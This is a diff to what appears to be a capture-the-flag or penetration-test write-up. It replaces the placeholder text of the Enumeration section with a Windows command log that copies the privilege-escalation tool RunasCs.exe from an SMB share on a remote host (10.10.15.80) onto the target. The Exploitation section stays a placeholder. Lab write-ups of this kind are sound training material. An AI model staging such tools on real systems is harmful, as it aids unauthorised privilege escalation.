@@ -239,8 +239,12 @@ Session completed.
 
 ### Enumeration
 
-What you found that leads to root/admin.
-
+```
+c:\Users\kohsuke>copy \\10.10.15.80\share\RunasCs.exe C:\users\kohsuke\RunasCs.exe
+copy \\10.10.15.80\share\RunasCs.exe C:\users\kohsuke\RunasCs.exe
+        1 file(s) copied.
+        
+```
 ### Exploitation
 
 Step-by-step privilege escalation.
